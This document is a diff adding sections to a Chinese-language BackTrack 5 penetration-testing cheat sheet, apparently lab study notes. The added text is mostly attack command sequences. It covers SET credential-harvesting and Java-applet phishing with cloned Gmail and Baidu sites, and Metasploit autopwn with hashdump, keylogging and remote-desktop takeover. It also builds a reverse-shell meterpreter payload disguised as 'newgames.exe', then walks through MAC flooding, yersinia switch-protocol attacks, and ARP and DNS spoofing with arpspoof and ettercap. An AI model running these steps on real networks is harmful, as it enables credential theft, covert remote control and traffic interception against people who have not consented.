@@ -3,6 +3,9 @@
 * [二、BT5.2011.2.扫描工具](#二BT520112扫描工具)  
 * [三、BT5.2011.3.漏洞发现](#三BT520113漏洞发现)  
 * [四、BT5.2011.4.社会工程学](#四BT520114社会工程学) 
+* [五、BT5.2011.5.运用层攻击MSF](#五BT520115运用层攻击MSF) 
+* [六、BT5.2011.6.局域网攻击](#六BT520116局域网攻击) 
+* [七、BT5.2011.7.密码破解](#七BT520117密码破解) 
 
 
 
@@ -241,8 +244,138 @@ samrdump.py cisco:cisco@10.1.1.1 445/SMB
     Scans->Add->Name[cisco]->ScanTargets[10.1.1.1]->Policy[Internal Network Scan]->Launch Scan
 ```
 ### 四、BT5.2011.4.社会工程学
+setoolkit：高级的、多功能的，并且易于使用的计算机社会工程学工具集
+##### 1、Java Applet Attack Method
+```
+    setoolkit
+    1）Social-Engineering Attacks
+    2）Website Attack Vectors
+    1）Java Applet Attack Method
+    2）Site Cloner[http://www.baidu.com]
+    略w
+    1）E-Mail Attack Single Email Address
+```
+##### 2、Credential Harvester Attack Method
+```
+    setoolkit
+    1）Social-Engineering Attacks
+    2）Website Attack Vectors
+    3）Credential Harvester Attack Method
+    2）Site Cloner[https://gmail.com]
+    略
+    1）E-Mail Attack Single Email Address
+```
+### 五、BT5.2011.5.运用层攻击MSF
+Metasrploit Framework(http://www.metasploit.com)是一个高级攻击攻击套件，MSF采用了模块化的设计，便于攻击者使用编程技能扩展和开发自定义插件和工具
+#### 1、MSF连环攻击
+```
+    msfconsole
+    db_nmap -T Aggressive -sV -n -O -v 10.1.1.2
+    db_hosts
+    db_services
+    db_autopwn -p -t -I 10.1.1.2 -e
+    session -i
+    getuid
+    sysinfo
+    run hashdump(复制结果到文件，如：sam-new-test)
+    ps
+    migrate 1576(找到一个管理员进程ID，权限提升)
+    keyscan_start(键盘记录)
+    keyscan_stop
+    run getgui -e(打开远程桌面)
+    run getgui -u cisco -p cisco
+    rdesktop 10.1.1.2:3389
 
-setoolkit
+    ophcrack -g -d [字典文件] -t [字典文件] -f [密码文件，如上：sam_new_test]
+```
+#### 2、MSF离线攻击
+```
+    msfpayload windows/meterpreter/reverse_tcp LHOST=10.1.1.1 LPORT=33333 X > /tmp/newgames.exe
+
+    msfconsole
+    use exploit/multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST 10.1.1.1
+    set LPORT 33333
+    exploit
+```
+### 六、BT5.2011.6.局域网攻击
+#### 1、MAC泛洪攻击
+交换机的CAM表没有记录主机的MAC，就向整个广播域（整个VLAN）泛洪
+攻击原理：
+    攻击主机制造大量随机伪装源MAC地址包进入交换机，使交换机的CAM表满，造成mac泛洪（unknown unicast flooding），相当于交换机变成集线器，攻击主机这时就可以抓取局域网中的其他主机间的数据交互
+```
+    macof
+    注：攻击主机可能需要多开几个
+```
+#### 2、yersinia
+```
+    yersinia -G
+    注：图形界面
+```
+##### 1）CDP
+Cisco Discovery Protocol，思科设备能够在它们直连的设备之间分享有关操作系统软件版本、IP地址、硬件平台等相关信息
+```
+    launch attack->CDP->flooding CDP table
+```
+##### 2）DHCP
+```
+    launch attack->DHCP->sending DISCOVER packet
+    注：攻击者需要搭建自己的DHCP服务器
+```
+##### 3）DTP
+Dynamic Trunk Protocol是一项动态中继协议，可以让Cisco交换机自动协商制定交换机之间的链路是否形成trunk
+```
+    launch attack->DTP->enabling trunking
+```
+##### 4）HSRP
+Hot Standby Routing Protocol（热备份路由协议），作用是能够把一台或多台路由器用来做备份，所谓热备份是指当使用的路由器不能正常工作时，候补的路由器能够实现平滑的替换
+```
+    launch attack->HSRP->becoming ACTIVE router
+```
+##### 5）STP
+Spanning Tree Protocol生成树协议，可应用于网络中建立树g形拓扑，消除网络中的环路，并可通过一定的方法实现路径冗余
+```
+    launch attack->STP->Claiming Root Role
+```
+#### 3、arpspoof
+```
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    arpspoof -t 10.1.1.1 10.1.1.2
+    arpspoof -t 10.1.1.2 10.1.1.1
+```
+#### 4、ettercap
+##### 1）ARP欺骗
+```
+    ettercap -G（图形界面）
+    Sniff->Unified sniffing->选择网卡
+    Hosts->Scan for hosts
+    目标主机1->Add to Target1
+    目标主机2->Add to Target2
+    Mitm->arp poisoning->Sniff remote connections
+    Start->Start sniffing
+    dsniff(抓包)
+```
+##### 2）DNS欺骗
+```
+    vi /usr/share/ettercap/etter.dns
+
+    www.baidu.com  A   192.168.1.101 
+    注：欺骗www.baidu.com的DNS为192.168.1.101
+
+    ettercap -G（图形界面）
+    Sniff->Unified sniffing->选择网卡
+    Hosts->Scan for hosts
+    目标主机1->Add to Target1
+    目标主机2->Add to Target2
+    Mitm->arp poisoning->Sniff remote connections
+    Start->Start sniffing
+    Plugins->Manage the plugins->dns_spoof双击
+
+    注：配合setoolkit工具使用，克隆一个网站（如：mail.google.com的邮箱）
+```
+### 七、BT5.2011.7.密码破解
+
 
 
 
